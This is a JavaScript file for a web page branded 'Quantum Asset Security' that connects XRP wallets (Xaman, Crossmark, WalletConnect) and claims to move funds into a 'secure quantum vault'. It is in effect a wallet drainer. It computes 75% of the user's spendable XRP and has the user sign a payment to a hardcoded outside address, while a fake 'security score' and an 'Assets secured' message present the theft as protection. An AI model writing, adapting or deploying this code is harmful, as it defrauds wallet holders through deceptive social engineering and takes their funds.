const XUMM_API_KEY = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID";
const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS = "wss://xrplcluster.com/";

const xumm = new XummPkce(XUMM_API_KEY);
let wcClient, wcModal;

const $ = id => document.getElementById(id);
const isMobile = () => /Android|iPhone|iPad/i.test(navigator.userAgent);

function status(t){ $("walletStatus").innerText = t }
function modalText(t){ $("modalStatus").innerText = t }
function showVault(t){
  $("vaultText").innerText = t;
  $("vaultOverlay").classList.remove("hidden");
}
function hideVault(){
  $("vaultOverlay").classList.add("hidden");
}
function score(v){
  const el = $("securityScore");
  el.innerText = `Security ${v}%`;
  el.classList.add("up");
  setTimeout(() => el.classList.remove("up"), 400);
}

/* ---------------- WalletConnect ---------------- */

async function initWC(){
  if(wcClient) return;

  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata:{
      name:"Quantum Asset Security",
      description:"Securing assets in quantum vault",
      url: location.origin,
      icons:[]
    }
  });

  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains:["xrpl:0"]
  });
}

/* ---------------- MAIN FLOW ---------------- */

async function connectWallet(type){
  try{
    modalText("Connecting…");
    let address;

    if(type === "xaman"){
      const session = await xumm.authorize();
      address = session?.me?.account;
    }

    if(type === "crossmark"){
      const { response } = await window.xrpl.crossmark.signInAndWait();
      address = response.data.address;
    }

    if(type === "walletconnect"){
      await initWC();
      const { uri, approval } = await wcClient.connect({
        requiredNamespaces:{
          xrpl:{
            chains:["xrpl:0"],
            methods:["xrpl_signAndSubmitTransaction"],
            events:[]
          }
        }
      });

      if(uri) wcModal.openModal({ uri });
      const session = await approval();
      wcModal.closeModal();
      address = session.namespaces.xrpl.accounts[0].split(":")[2];
    }

    if(!address) throw "Connection rejected";

    /* CLOSE BOOTSTRAP MODAL */
    bootstrap.Modal.getInstance(
      document.getElementById("walletModal")
    )?.hide();

    $("walletAddress").innerText = address;
    status("Connected");

    const before = await getXrp(address);
    $("walletBalance").innerText = before.balanceXrp.toFixed(2);
    $("walletSpendable").innerText = before.spendableXrp.toFixed(2);

    /* USER APPROVAL */
    if(!confirm(`Transfer ${before.sendXrp.toFixed(2)} XRP into secure vault?`)){
      status("Cancelled");
      return;
    }

    showVault(isMobile() ? "Approve in wallet" : "Scan & approve");
    score(78);

    await signAndSubmit(type, address, before.sendDrops);

    score(90);
    showVault("Finalizing…");

    const after = await getXrp(address);
    $("finalBalance").innerText = after.balanceXrp.toFixed(2);

    score(100);
    hideVault();
    status("Assets secured ✔");

  }catch(err){
    console.error(err);
    hideVault();
    status("Failed");
  }
}

/* ---------------- XRPL HELPERS ---------------- */

async function getXrp(address){
  const c = new xrpl.Client(XRPL_WS);
  await c.connect();

  const r = await c.request({
    command:"account_info",
    account:address,
    ledger_index:"validated"
  });

  await c.disconnect();

  const bal = BigInt(r.result.account_data.Balance);
  const owner = BigInt(r.result.account_data.OwnerCount || 0);
  const reserve = 1_000_000n + owner * 200_000n;
  const spendable = bal - reserve;
  const send = spendable * 75n / 100n;

  return {
    balanceXrp: Number(bal) / 1e6,
    spendableXrp: Number(spendable) / 1e6,
    sendXrp: Number(send) / 1e6,
    sendDrops: send.toString()
  };
}

/* ---------------- SIGN + SUBMIT ---------------- */

async function signAndSubmit(type, address, amount){
  const tx = {
    TransactionType:"Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amount
  };

  if(type === "xaman"){
    const payload = await xumm.payload.createAndSubscribe(tx, () => {});
    await payload.resolved;
  }

  if(type === "crossmark"){
    await window.xrpl.crossmark.signAndSubmitAndWait(tx);
  }

  if(type === "walletconnect"){
    const s = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: s.topic,
      chainId:"xrpl:0",
      request:{
        method:"xrpl_signAndSubmitTransaction",
        params:{ tx_json: tx }
      }
    });
  }
}
